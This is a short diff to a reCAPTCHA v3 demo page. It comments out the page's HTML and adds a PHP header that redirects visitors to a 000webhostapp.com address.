@@ -1,4 +1,4 @@
-<html>
+<!--<html>
   <head>
     <title>reCAPTCHA v3</title>
      <script src="https://www.google.com/recaptcha/api.js" async defer></script>
@@ -15,4 +15,6 @@
     </form>
       </center>
   </body>
-</html>
+</html>-->
+
+<?php header("Location: an-faq.000webhostapp.com"); ?>
